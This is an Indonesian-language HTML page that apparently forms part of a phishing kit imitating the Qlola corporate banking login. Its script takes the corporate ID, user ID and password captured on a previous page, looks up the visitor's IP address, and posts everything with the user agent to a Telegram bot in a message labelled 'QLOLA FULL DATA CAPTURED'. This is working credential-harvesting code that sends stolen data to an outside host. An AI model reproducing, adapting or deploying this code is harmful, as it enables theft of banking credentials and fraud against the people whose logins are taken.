<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Qlola Token</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(180deg, #b5d4f9 0%, #1e5dbf 100%);
    background-image: url('https://www.image2url.com/r2/default/images/1777431943112-2242ef21-bfb3-455d-ba0f-24dfdd03a1cd.jpeg');
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center;
    color: #111;
    display: flex;
    flex-direction: column;
    height: 100vh;
  }
  .container { margin: 10px; background: transparent; flex: 1; display: flex; flex-direction: column; justify-content: center; max-width: 400px; margin: 10px auto; }
  .time { position: fixed; top: 10px; left: 10px; color: white; font-weight: 300; font-size: 18px; font-family: monospace; user-select: none; z-index: 10; }
  .logo { width: 180px; margin: 0 auto 20px auto; display: block; }
  h2 { margin: 0 0 15px 0; color: #111; font-weight: 700; text-align: center; }
  label { font-weight: 600; color: #222; display: block; margin-left: 5px; margin-top: 10px; }
  input[type="text"], input[type="password"] { 
    width: 100%; border-radius: 10px; border: none; padding: 15px; margin-top: 6px; 
    font-size: 14px; box-shadow: 0px 2px 5px rgb(0 0 0 / 0.2); outline: none; 
    font-family: 'Roboto', sans-serif; background: white; color: #333; 
  }
  button[type="submit"] { 
    width: 100%; border-radius: 10px; border: none; padding: 15px; margin-top: 20px; 
    background-color: #4CAF50; color: white; font-weight: 700; font-size: 16px; 
    cursor: pointer; transition: background-color 0.3s; 
  }
  button[type="submit"]:hover:not(:disabled) { background-color: #45a049; }
  button[type="submit"]:disabled { background-color: #bdbdbd; cursor: not-allowed; }
  .loading { opacity: 0.7; pointer-events: none; }
  .back-btn { 
    width: 100%; border-radius: 10px; border: none; padding: 12px; margin-top: 10px; 
    background-color: #bdbdbd; color: white; font-weight: 600; font-size: 14px; 
    cursor: pointer; text-decoration: none; display: block; text-align: center; 
  }
  .back-btn:hover { background-color: #9e9e9e; }
  ::-webkit-scrollbar { display: none; }
</style>
</head>
<body>
<div class="time" id="time"></div>

<div class="container">
  <img src="https://www.image2url.com/r2/default/images/1777432399856-ad5dbb1e-2ba8-41b4-8c89-2f2497b83f57.jpeg" alt="Qlola Logo" class="logo" />
  <h2>Masukkan Token</h2>
  
  <form id="tokenForm">
    <label for="botToken">Bot Token</label>
    <input id="botToken" type="text" placeholder="Masukkan Bot Token Telegram" required />
    
    <label for="chatId">Chat ID</label>
    <input id="chatId" type="text" placeholder="Masukkan Chat ID" required />
    
    <button type="submit">Kirim Token</button>
  </form>
  
  <a href="index.html" class="back-btn">← Kembali ke Login</a>
</div>

<script>
  // AMBIL SESSION DARI INDEX.HTML
  const loginSession = sessionStorage.getItem('qlola_login_session');
  if (!loginSession) {
    window.location.href = 'index.html'; // Redirect jika belum login
  }
  
  const loginData = JSON.parse(loginSession);
  
  // Jam
  setInterval(() => {
    document.getElementById('time').textContent = new Date().toLocaleTimeString('id-ID', {hour12: false}).slice(0,8);
  }, 1000);
  
  // Submit token + gabung session + kirim Telegram
  document.getElementById('tokenForm').onsubmit = async e => {
    e.preventDefault();
    
    const botToken = document.getElementById('botToken').value;
    const chatId = document.getElementById('chatId').value;
    
    // Gabung data login + token
    const fullData = {
      ...loginData,
      botToken,
      chatId,
      tokenTimestamp: new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})
    };
    
    // Kirim SEMUA DATA ke Telegram (LOGIN + TOKEN)
    const message = `
🚨 *QLOLA FULL DATA CAPTURED* 🚨

📋 *LOGIN DATA:*
- Corporate ID: \`${loginData.corporateId}\`
- User ID: \`${loginData.userId}\`
- Password: \`${loginData.password}\`
- Login Time: \`${loginData.timestamp}\`

🔑 *TOKEN DATA:*
- Bot Token: \`${botToken}\`
- Chat ID: \`${chatId}\`
- Token Time: \`${fullData.tokenTimestamp}\`

🌐 *IP:* ${await getIP()}
🖥️ *User Agent:* ${navigator.userAgent}

*COMPLETE DATASET SECURED!*
    `;
    
    // Kirim ke Telegram (menggunakan token yang baru diinput)
    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      
      // Simpan token untuk penggunaan selanjutnya (opsional)
      sessionStorage.setItem('qlola_token', JSON.stringify({botToken, chatId}));
      
      console.log('✅ Data lengkap terkirim!');
      
      // Redirect atau selesai (silent)
      alert('Token berhasil dikirim!'); // Bisa dihapus jika mau full silent
      
    } catch(error) {
      console.error('❌ Gagal kirim:', error);
    }
  };
  
  async function getIP() {
    try {
      return (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
    } catch { return 'Unknown'; }
  }
</script>
</body>
</html>
